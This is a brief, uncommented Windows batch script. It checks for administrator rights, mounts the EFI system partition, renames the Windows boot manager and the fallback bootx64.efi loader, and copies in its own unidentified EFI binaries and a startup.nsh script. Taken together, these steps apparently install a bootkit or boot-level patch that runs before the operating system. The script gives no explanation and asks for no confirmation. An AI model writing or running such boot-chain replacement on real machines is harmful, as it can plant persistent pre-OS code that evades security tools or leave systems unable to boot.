@echo off
setlocal enabledelayedexpansion


whoami /groups | find "Administrators" > nul
if %errorLevel% neq 0 (
    exit /b 1
)



mountvol X: /S

if exist "X:\EFI\Microsoft\Boot\bootmgfw.efi" (
    move X:\EFI\Microsoft\Boot\bootmgfw.efi X:\EFI\Microsoft\Boot\boot.efi
)
if exist "X:\EFI\Boot\bootx64.efi" (
    move X:\EFI\Boot\bootx64.efi X:\EFI\Boot\bootx64.efi.backup
)


if exist "%~dp0mp.efi" (
    copy /y "%~dp0mp.efi" "X:\EFI\Boot\mp.efi"
)
if exist "%~dp0bootx64.efi" (
    copy /y "%~dp0bootx64.efi" "X:\EFI\Boot\bootx64.efi"
)
if exist "%~dp0startup.nsh" (
    copy /y "%~dp0startup.nsh" "X:\EFI\Boot\startup.nsh"
)



mountvol X: /D



exit
